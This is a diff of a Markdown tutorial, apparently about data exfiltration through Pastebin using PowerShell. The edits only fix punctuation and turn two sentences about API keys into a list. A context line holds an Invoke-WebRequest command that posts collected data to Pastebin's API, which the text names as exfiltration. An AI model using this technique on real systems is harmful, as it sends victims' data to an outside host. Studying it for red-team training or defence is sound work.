@@ -53,12 +53,10 @@ $Body = @{
 Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
 ```
 ## Preparing more advanced use of Pastebin
-Thus far, so our data exiltration is public.​ Thanks to the API key we can upload to Pastebin but we need to use authentication to make it private, so let’s make it private​ 😃
+Thus far, so our data exiltration is public.​ Thanks to the API key we can upload to Pastebin but we need to use authentication to make it private, so let’s make it private​ 😃.
 
 For this we need to setup our “userkey”​
 
-This means we will use 2 keys​
-
-Our dev key, which we already have​
-
-Our user key, still needs creation
+This means we will use 2 keys​: 
+1. Our dev key, which we already have​.
+2. Our user key, which still needs creation.
